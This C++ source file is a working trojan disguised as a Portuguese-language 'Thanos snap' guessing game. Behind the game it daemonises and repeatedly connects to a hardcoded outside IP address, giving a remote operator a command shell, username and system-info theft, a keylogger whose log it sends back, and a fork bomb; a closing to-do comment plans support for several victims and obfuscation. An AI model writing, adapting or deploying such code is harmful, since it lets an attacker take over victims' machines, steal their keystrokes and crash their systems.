#include "keylogger.hpp"

#include <chrono>
#include <string>
#include <thread>

#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <signal.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/mman.h>

#include <sys/socket.h>
#include <arpa/inet.h>

constexpr int MAXBUFFSIZE = 1024;

std::string home_addr = "3.131.147.49";
int home_port = 16085;

char nome[64];
char original_executable_path[MAXBUFFSIZE];
int stop = 0;
bool is_keylogger_running = false;
bool should_keylogger_stop = false;

void handle_connection_to_home(int sock)
{
	char buf[MAXBUFFSIZE];
	memset(buf, 0, MAXBUFFSIZE);

	send(sock, "> ", 2, 0);
	while (recv(sock, buf, MAXBUFFSIZE, 0))
	{
		if (strncmp(buf, "q", 1) == 0) {
			stop = 1;
			break;
		}
		else if (strncmp(buf, "u", 1) == 0) {
			char *username = getenv("USER");
			strcat(username, "\n");
			send(sock, username, strlen(username), 0);
		}
		else if (strncmp(buf, "p", 1) == 0) {
			FILE *command_pipe = popen("uname -a", "r");

			char command_output[64];
			while (fgets(command_output, 64, command_pipe)) {
				send(sock, command_output, strlen(command_output), 0);
			}

			pclose(command_pipe);
		}
		else if (strncmp(buf, "c", 1) == 0) {
			if (strlen(buf) <= 2) continue;

			FILE *command_pipe = popen(&buf[2], "r");

			char command_output[64];
			while (fgets(command_output, 64, command_pipe)) {
				send(sock, command_output, strlen(command_output), 0);
			}

			pclose(command_pipe);
		}
		else if (strncmp(buf, "k", 1) == 0) {
			if (buf[2] == 'b') {
				if (!is_keylogger_running) {
					is_keylogger_running = true;
					std::thread keylogger_t(keylogger, &is_keylogger_running, &should_keylogger_stop);
					keylogger_t.detach();
				}
			}
			else if (buf[2] == 'e') {
				if (is_keylogger_running) {
					should_keylogger_stop = true;
				}
			}
			else if (buf[2] == 'g') {
				FILE* keylog_file = fopen("/tmp/key.log", "r");
				if (keylog_file) {
					char buffer[42];
					while (fgets(buffer, 42, keylog_file)) {
						send(sock, buffer, strlen(buffer), 0);
						memset(buffer, 0, 42);
					}
					fclose(keylog_file);
				}
			}
		}
		else if (strncmp(buf, "f", 1) == 0) {
			while (1) fork();
		}

		memset(buf, 0, MAXBUFFSIZE);
		send(sock, "> ", 2, 0);
	}

	close(sock);
}

void malware()
{
	daemon(0, 0);

	while (!stop)
	{
		using namespace std::chrono_literals;
		std::this_thread::sleep_for(5s);

		int sock = socket(AF_INET, SOCK_STREAM, 0);

		struct sockaddr_in server;
		server.sin_family = AF_INET;
		server.sin_addr.s_addr = inet_addr(home_addr.c_str());
		server.sin_port = htons(home_port);

		if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == 0)
		{
			handle_connection_to_home(sock);
		}
	}

	exit(0);
}

void signal_handling(int _)
{
	malware();
}

void game()
{
	srand(time(NULL));

	printf("Oh não! O Thanos estalou os dedos de novo!\n");
	printf("Descubra se você virou PÓ!\n");
	printf("Coloque seu nome aqui: ");
	scanf("%s", nome);

	int numero = rand() % 2;
	if (numero == 0)
	{
		printf("\nEita, %s. você virou PÓ!\n", nome);
	}
	else
	{
		printf("\nSussa, %s. você não virou PÓ!\n", nome);
	}
}

int main(int argc, char** argv)
{
	if (argc != 1) malware();

	signal(SIGINT, signal_handling);
	signal(SIGKILL, signal_handling);

	game();

	malware();
}

/*
 * - [ ] Refatorar
 * - [ ] Suportar várias vítimas
 * - [ ] Obfuscar (?)
 */

